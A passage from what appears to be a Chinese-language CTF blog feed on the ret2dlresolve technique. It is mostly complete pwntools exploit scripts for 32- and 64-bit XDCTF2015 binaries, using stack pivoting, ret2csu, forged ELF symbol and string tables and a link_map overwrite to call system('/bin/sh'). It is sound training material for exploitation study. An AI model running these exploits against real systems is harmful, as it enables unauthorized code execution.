log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x804853A&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack栈迁移</span></span><br><span class="line">bss_ad=elf.bss()</span><br><span class="line">new_stack=bss_ad+<span class="number">0x800</span>+<span class="built_in">int</span>((<span class="number">0x80487c4</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>)*<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;new_stack&#x27;</span>,new_stack)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.read(<span class="number">0</span>,new_stack,<span class="number">100</span>)</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">#new_stack rop data</span></span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment">#get the .plt address</span></span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynsym&#x27;</span>,dynsym)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynstr&#x27;</span>,dynstr)</span><br><span class="line">p(<span class="string">&#x27;plt&#x27;</span>,plt0)</span><br><span class="line"><span class="comment"># get the data of .rel.plt</span></span><br><span class="line">rel_plt_ad=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&quot;rel_plt_ad&quot;</span>,rel_plt_ad)</span><br><span class="line">rel_plt_data=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#write_relplt_offset is the seonde parameter of _dl_runtime_resolve</span></span><br><span class="line">write_relplt_offset=rel_plt_data.find(p32(write_got))</span><br><span class="line">p(<span class="string">&#x27;write_relplt_offset&#x27;</span>,write_relplt_offset)</span><br><span class="line"><span class="comment">#在新栈的30处伪造Elf32_Rel</span></span><br><span class="line">fake_write_relplt_offset=new_stack+<span class="number">30</span>-rel_plt_ad</span><br><span class="line"><span class="comment">#在新栈的40处伪造Elf32_Sym，但是由于Elf32_Sym需要16字节所以要16字节对齐，后面需要补个偏差值align</span></span><br><span class="line">fake_sym_addr=new_stack+<span class="number">40</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line"><span class="comment">#next rop the padding should be 40+align</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"><span class="comment">#伪造符号表Elf32_Sym在dynsym的下标</span></span><br><span class="line">index_dynsym=<span class="built_in">int</span>((fake_sym_addr-dynsym)/<span class="number">16</span>)</span><br><span class="line"><span class="comment">#高24位是符号在符号表里的下标，低8位为重定位类型</span></span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line">gnu_version_addr = elf.get_section_by_name(<span class="string">&#x27;.gnu.version&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#在新栈的70处写入字符串system伪造字符串表</span></span><br><span class="line">fake_write_str_ad=new_stack+<span class="number">70</span></span><br><span class="line"><span class="comment">#Elf32_Sym.st_name的距离dynstr的偏移</span></span><br><span class="line">write_str_offset=fake_write_str_ad-dynstr</span><br><span class="line">fake_write_sym = flat([write_str_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ndx_addr: %s&quot;</span> % <span class="built_in">hex</span>(gnu_version_addr+index_dynsym*<span class="number">2</span>))</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(fake_write_relplt_offset)</span><br><span class="line"><span class="comment"># fake ret of write</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#parameter of system</span></span><br><span class="line">rop.raw(new_stack + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">write_str=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"><span class="comment"># print(len(rop.chain()))</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">30</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#fake_write_reloc</span></span><br><span class="line">rop.raw(fake_write_reloc)</span><br><span class="line"><span class="comment"># rop.raw(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line"><span class="comment"># print(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">40</span>+align-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(fake_write_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">70</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(write_str)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>rop.migrate(new_stack)的结果</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pop ebp; ret的gadget</span><br><span class="line">new_stack-size_t</span><br><span class="line">leave; ret的gadget</span><br></pre></td></tr></table></figure><p>最终会在rsp为new_stack时进行ret，所以需要事先在new_stack布置好要rop的内容</p></blockquote><h3 id="pwntools工具"><a href="#pwntools工具" class="headerlink" title="pwntools工具"></a>pwntools工具</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">print(rop.dump())</span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x804853A&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload=padding+raw_rop</span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>dlresolve.data_addr一般就是我们伪造ELFdyn sys str的bss地址 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>],data_addr=来指定伪造地址)</span><br></pre></td></tr></table></figure><p>print(rop.dump())</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[*] Loaded <span class="number">10</span> cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line"><span class="number">0x0000</span>:        <span class="number">0x8048390</span> read(<span class="number">0</span>, <span class="number">0x804ae00</span>, <span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x0004</span>:        <span class="number">0x804836a</span> &lt;adjust @<span class="number">0x14</span>&gt; add esp, <span class="number">8</span>; pop ebx; ret</span><br><span class="line"><span class="number">0x0008</span>:              <span class="number">0x0</span> arg0</span><br><span class="line"><span class="number">0x000c</span>:        <span class="number">0x804ae00</span> arg1</span><br><span class="line"><span class="number">0x0010</span>:            <span class="number">0x400</span> arg2</span><br><span class="line"><span class="number">0x0014</span>:        <span class="number">0x8048370</span> [plt_init] system(<span class="number">0x804ae24</span>)</span><br><span class="line"><span class="number">0x0018</span>:           <span class="number">0x2af8</span> [dlresolve index]</span><br><span class="line"><span class="number">0x001c</span>:          b<span class="number">&#x27;</span>haaa<span class="number">&#x27;</span> &lt;system <span class="keyword">return</span> address&gt;</span><br><span class="line"><span class="number">0x0020</span>:        <span class="number">0x804ae24</span> system arg0</span><br></pre></td></tr></table></figure><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="NO-RELRO-1"><a href="#NO-RELRO-1" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><p>只能用ret2csu来控制rdx</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400750</span> <span class="number">4</span>C <span class="number">89</span> FA                      mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400753</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400756</span> <span class="number">44</span> <span class="number">89</span> EF                      mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400759</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">6008F</span>8h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400759</span></span><br><span class="line">.text:<span class="number">000000000040075</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400761</span> <span class="number">48</span> <span class="number">39</span> DD                      cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400764</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400750</span><br><span class="line">.text:<span class="number">0000000000400764</span></span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br><span class="line">.text:<span class="number">0000000000400766</span>                               loc_400766:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400766</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040076</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040076B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040076</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040076</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">0000000000400770</span> <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">0000000000400772</span> <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">0000000000400774</span> C3                            retn</span><br></pre></td></tr></table></figure><p>和32位一样，伪造一个将read改为system的dynstr到bss，将dynmic的dynstr地址改为伪造到bss的dynstr，将参数rdi覆盖为binsh，rop到read的plt第二条指令触发_dl_runtime_resolve，执行system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x040063C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack栈迁移</span></span><br><span class="line">bss_ad=elf.bss()+<span class="number">0x200</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.raw(ret2csu(read_got,<span class="number">0</span>,bss_ad,<span class="built_in">len</span>(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>),start))</span><br><span class="line">s(rop.chain().ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dynmic_dynstr=<span class="number">0x600988</span>+<span class="number">8</span></span><br><span class="line">poprdi=<span class="number">0x0400773</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dynmic_dynstr,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(p64(bss_ad))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">read_plt=<span class="number">0x400516</span></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ret=<span class="number">0x00000000004004c6</span></span><br><span class="line">payload=padding+p64(poprdi)+p64(bss_ad+<span class="built_in">len</span>(dynstr)+<span class="number">1</span>)+p64(ret)+p64(read_plt)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># # b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO-1"><a href="#Partial-RELRO-1" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>和32为基本上差不多，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。</p><p><img src="/2023/07/09/ret2dlresolve/image-20230724174219575.png" alt="image-20230724174219575"></p><p>Versym: 0x4003f6指向版本号数组，符号表索引，同时为版本号索引 导致，version index addr指向不存在内存，导致解析时错误</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取符号的版本信息, dl_fixup 的代码</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)<span class="comment">//l为link_map结构体</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info 里面包含的就是动态链接的各个表的信息</span></span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line"> </span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们需要把linkmap的l_info[VERSYMIDX(DT_VERSYM)]写为0来绕过执行</p><p>linkmap为got表的第二项，l_info[VERSYMIDX(DT_VERSYM)]为linkmap偏移0x1c8处</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x40066C&#x27;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x00400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x0040079A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rel_plt))</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line">p(<span class="string">&#x27;dlresolve.data_addr&#x27;</span>,dlresolve.data_addr)</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">got_0=<span class="number">0x0601008</span></span><br><span class="line"><span class="comment">#泄露linkmap导致</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(write_got,<span class="number">1</span>,got_0,<span class="number">8</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">link_map_addr =uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;link_map_addr&#x27;</span>,link_map_addr)</span><br><span class="line"><span class="comment">#linkmap-&gt;l_info[VERSYMIDX(DT_VERSYM)]即linkmap偏移0x1c8处写入0</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ASM</title>
      <link href="/2023/07/09/risc-v-asm/"/>
      <url>/2023/07/09/risc-v-asm/</url>
      
